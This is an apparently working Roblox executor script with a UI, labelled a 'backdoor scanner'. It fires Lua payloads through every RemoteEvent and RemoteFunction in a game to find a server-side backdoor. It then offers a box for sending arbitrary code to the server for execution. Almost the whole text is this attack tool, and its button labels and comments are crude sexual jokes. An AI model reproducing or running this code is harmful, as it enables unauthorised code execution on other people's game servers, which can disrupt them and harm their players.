local LocalPlayer = game:GetService("Players").LocalPlayer
local RunService = game:GetService("RunService")
local CoreGui = gethui and gethui() or game:GetService("CoreGui")

local SG = Instance.new("ScreenGui")
SG.Name = "test"
SG.Parent = CoreGui

local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true; dragStart = input.Position; startPos = frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local Main = Instance.new("Frame", SG)
Main.Size = UDim2.new(0, 400, 0, 250)
Main.Position = UDim2.new(0.5, -200, 0.5, -125)
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
makeDraggable(Main)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "PP Backdoor | Fastest Backdoor Scanner on Pluto????"
Title.Font = Enum.Font.Arimo
Title.TextColor3 = Color3.new(1,1,255)
Title.TextScaled = true

local ScanBtn = Instance.new("TextButton", Main)
ScanBtn.Size = UDim2.new(0.8, 0, 0, 50)
ScanBtn.Position = UDim2.new(0.1, 0, 0.4, 0)
ScanBtn.Text = "SCAN FOR MY DICK"
ScanBtn.Font = Enum.Font.RobotoMono
ScanBtn.BackgroundColor3 = Color3.new(0,0,0)
ScanBtn.BackgroundTransparency = 0.5
ScanBtn.TextColor3 = Color3.new(1,1,1)
ScanBtn.TextScaled = true
Instance.new("UICorner", ScanBtn)

local ExecFrame = Instance.new("Frame", Main)
ExecFrame.Size = UDim2.new(1, 0, 1, 0)
ExecFrame.BackgroundTransparency = 1
ExecFrame.Visible = false

local CodeBox = Instance.new("TextBox", ExecFrame)
CodeBox.Size = UDim2.new(0.9, 0, 0.5, 0)
CodeBox.Position = UDim2.new(0.05, 0, 0.2, 0)
CodeBox.BackgroundColor3 = Color3.new(0,0,0)
CodeBox.BackgroundTransparency = 0.5
CodeBox.Text = "-- Loaded in corny executor o: (also lalol loves logging and cumming)"
CodeBox.Font = Enum.Font.RobotoMono
CodeBox.TextColor3 = Color3.new(1,1,1)
CodeBox.ClearTextOnFocus = false
CodeBox.MultiLine = true
CodeBox.TextXAlignment = 0
CodeBox.TextYAlignment = 0
Instance.new("UICorner", CodeBox)

local function cBtn(txt, pos, size)
    local b = Instance.new("TextButton", ExecFrame)
    b.Size = size; b.Position = pos; b.Text = txt
    b.BackgroundColor3 = Color3.new(0,0,0)
    b.BackgroundTransparency = 0.3
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.RobotoMono
    b.TextScaled = true
    Instance.new("UICorner", b)
    return b
end

local ClearBtn = cBtn("clear the cum from the floor", UDim2.new(0.05, 0, 0.75, 0), UDim2.new(0.25, 0, 0, 40))
local FillBtn = cBtn("auto fill my dick", UDim2.new(0.35, 0, 0.75, 0), UDim2.new(0.25, 0, 0, 40))
local ExecBtn = cBtn("execute dick", UDim2.new(0.65, 0, 0.75, 0), UDim2.new(0.3, 0, 0, 40))

local TargetRemote = nil
local IsScanning = false

game.Workspace.ChildAdded:Connect(function(c)
    if c.Name == "GP_V" and IsScanning then
        TargetRemote = _G.CustomScanMap[c.Value]
        c:Destroy()
        if TargetRemote then
            IsScanning = false
            ScanBtn.Visible = false
            ExecFrame.Visible = true
            local hintCode = 'Instance.new("Hint", workspace).Text = "found in 0.0000002 seconds"'
            pcall(function() 
                if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(hintCode) 
                else task.spawn(function() TargetRemote:InvokeServer(hintCode) end) end 
            end)
        end
    end
end)

ScanBtn.MouseButton1Click:Connect(function()
    if IsScanning then return end
    IsScanning = true
    ScanBtn.Text = "SCANNING for cum....."
    _G.CustomScanMap = {}
    local remotes = {}
    for _, s in ipairs({game.ReplicatedStorage, game.JointsService, game.Lighting, game.SoundService, game.Workspace}) do 
        for _, v in ipairs(s:GetDescendants()) do 
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then table.insert(remotes, v) end 
        end 
    end
    task.spawn(function()
        for i, r in ipairs(remotes) do
            if not IsScanning then break end
            pcall(function()
                local uid = tostring(i)
                _G.CustomScanMap[uid] = r
                local p = "local a=Instance.new('StringValue',workspace);a.Name='GP_V';a.Value='"..uid.."'"
                if r:IsA("RemoteEvent") then r:FireServer(p) else task.spawn(function() r:InvokeServer(p) end) end
            end)
            if i % 30 == 0 then RunService.Heartbeat:Wait() end
        end
    end)
end)

ExecBtn.MouseButton1Click:Connect(function()
    if TargetRemote then
        pcall(function() if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(CodeBox.Text) else task.spawn(function() TargetRemote:InvokeServer(CodeBox.Text) end) end end)
    end
end)
ClearBtn.MouseButton1Click:Connect(function() CodeBox.Text = "" end)
FillBtn.MouseButton1Click:Connect(function() CodeBox.Text = CodeBox.Text:gsub('"(.-)"', '"' .. LocalPlayer.Name .. '"') end)
